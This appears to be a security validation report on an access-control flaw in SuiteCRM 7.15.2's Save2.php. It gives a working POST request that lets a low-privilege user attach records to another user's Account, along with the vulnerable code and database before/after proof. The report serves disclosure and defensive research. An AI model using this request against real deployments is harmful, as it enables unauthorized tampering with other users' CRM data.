# VULN-023 — `Save2`: create relationships / relate arbitrary records on any record (no ACL)

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: High
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28T20:49Z

## Preconditions
- `automation.py` creates two fresh, unrelated low-priv users via admin (`create_user`): victim **V** and attacker **A**.
- As **V**: creates an Account (owned by V; A has no ACL/ownership/Security-Group relation to it).
- As **A**: creates **A's own** Contact — a record A is legitimately entitled to create, but with no relationship to V's Account. This is the cleanest possible test of the boundary: A never touches V's data during setup, only during the attack.
- **Note on `$beanList['Teams']`**: the raw finding's exploitation scenario also mentions `add_user_to_team()` (`Save2.php:183/186`, reached when `$bean_name == 'Team'`). Verified this branch is **dead code** in this checkout: `include/modules.php` defines no `$beanList['Teams']` entry (grep confirmed), so no value of `$_REQUEST['module']` can make `$beanList[$_REQUEST['module']]` resolve to the string `'Team'`, and the branch can never execute via normal routing. This exploit instead demonstrates the OTHER, clearly-reachable half of the same missing-ACL defect: `$focus->$relName->add(...)` at `:202`, relating an arbitrary record onto a parent the caller doesn't own — the sink the report itself cites first.

## Request
See `request.http`. As **A** (owns the Contact, owns nothing on the Account):
```
POST /index.php?module=Accounts&action=Save2
Cookie: PHPSESSID=<attacker session>
Referer: http://localhost:33116/index.php?module=Accounts&action=DetailView&record=<V's account>
Content-Type: application/x-www-form-urlencoded

record=<V's account>&subpanel_field_name=contacts&subpanel_id=<A's contact>&subpanel_module_name=Contacts&refresh_page=1
```

## Response
See `response.txt` — HTTP 200, `Content-Length: 0` (`refresh_page=1` skips the trailing `header("Location: ...")`/redirect, same technique as VULN-022; the save/relate logic ran before that point regardless).

## Observation
Matches the static finding exactly. `include/generic/Save2.php` contains no `ACLAccess`/`checkAccess`/`is_admin`/`ACLController` call anywhere (re-confirmed by source read):
```php
$focus->retrieve($_REQUEST['record']);            // :124 -- loads V's Account, no ACL
...
if (!empty($_REQUEST['subpanel_field_name']) && !empty($_REQUEST['subpanel_id'])) {
    $relName = $_REQUEST['subpanel_field_name'];
    if ($focus->load_relationship($relName)) {
        $focus->$relName->add($_REQUEST['subpanel_id'], $add_values);   // :202 -- relate A's Contact
        $focus->save();                                                 // :203 -- writes V's Account row
    }
}
```

**Double DB proof of the real effect** (not just HTTP 200):
```
BEFORE: accounts_contacts row for (V's account, A's contact): <empty>
        accounts.modified_user_id for V's account:             <V's own id>

AFTER:  accounts_contacts row:  98bdc931-79f6-40ea-a7a4-e3109efb4921   deleted=0   (NEW ROW)
        accounts.modified_user_id for V's account: 1eb995b3-a66b-4e74-bafd-957fd17fe291  (== ATTACKER A's id)
```
Not only did the relationship row get created, but `SugarBean::save()` (called on V's Account bean, `Save2.php:203`) stamped **attacker A's own user id** into V's Account's `modified_user_id` column — direct proof that A's unauthorized request mutated a database row belonging to a record A does not own, has no ACL grant on, and never interacted with before this request.

## Side effects
Two new Users, one Account (V), one Contact (A) created (random-suffixed, harmless). One new `accounts_contacts` relationship row created (the one under test). V's Account's `modified_user_id`/`date_modified` changed as a direct, intended-to-be-observed consequence of the vulnerability being demonstrated — no other fields altered, nothing deleted.

## Research & references
- CWE-284 (Improper Access Control) — OWASP A01:2021-Broken Access Control.
- Same missing-ACL root cause and same generic-file dispatch pattern (`action_file_map` bypassing the module controller) as [VULN-022](VULN-022.md) (delete side) and [VULN-024](VULN-024.md) (read side) — together these three cover create/delete/read on the same class of unauthorized relationship-boundary crossing.
